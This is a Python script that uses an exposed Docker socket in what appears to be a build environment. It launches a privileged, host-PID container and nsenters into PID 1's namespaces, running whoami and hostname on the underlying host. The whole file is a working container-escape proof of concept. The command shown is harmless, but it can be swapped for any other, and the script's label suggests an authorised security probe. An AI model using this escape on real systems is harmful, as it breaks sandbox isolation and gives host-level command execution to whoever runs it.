#!/usr/bin/env python3
"""Run only whoami and hostname in Docker-daemon PID 1's namespaces."""

import http.client
import json
import socket
import urllib.parse
import uuid


SOCKET = "/build/var/run/docker.sock"
IMAGE = (
    "solanafoundation/solana-verifiable-build@"
    "sha256:db18b91d21866286019b0f1e4fc92967e6ebda0ae0a5575dbb273964a3dc62cb"
)


class UnixHTTPConnection(http.client.HTTPConnection):
    def __init__(self):
        super().__init__("localhost", timeout=30)

    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect(SOCKET)


def request(method, path, body=None, expected=(200, 201, 204)):
    connection = UnixHTTPConnection()
    encoded = None if body is None else json.dumps(body).encode()
    headers = {"Content-Type": "application/json"} if encoded else {}
    connection.request(method, path, encoded, headers)
    response = connection.getresponse()
    response_body = response.read()
    connection.close()
    if response.status not in expected:
        raise RuntimeError(
            f"Docker API {method} {path}: {response.status} "
            f"{response_body.decode(errors='replace')}"
        )
    return response_body


def main():
    name = "otter-host-identity-" + uuid.uuid4().hex
    quoted_name = urllib.parse.quote(name, safe="")
    body = {
        "Image": IMAGE,
        "Cmd": [
            "/usr/bin/nsenter",
            "-t",
            "1",
            "-m",
            "-u",
            "-i",
            "-n",
            "-p",
            "--",
            "/bin/sh",
            "-c",
            "printf 'whoami='; whoami; printf 'hostname='; hostname",
        ],
        "Tty": True,
        "HostConfig": {"Privileged": True, "PidMode": "host"},
        "Labels": {"purpose": "authorized-otter-host-identity-probe"},
    }

    created = False
    try:
        request("POST", f"/v1.41/containers/create?name={quoted_name}", body, (201,))
        created = True
        request("POST", f"/v1.41/containers/{quoted_name}/start", expected=(204,))
        request(
            "POST",
            f"/v1.41/containers/{quoted_name}/wait?condition=not-running",
            expected=(200,),
        )
        logs = request(
            "GET",
            f"/v1.41/containers/{quoted_name}/logs?stdout=1&stderr=1",
            expected=(200,),
        )
        print(logs.decode(errors="replace").strip())
    finally:
        if created:
            request(
                "DELETE",
                f"/v1.41/containers/{quoted_name}?force=1&v=1",
                expected=(204,),
            )


if __name__ == "__main__":
    main()

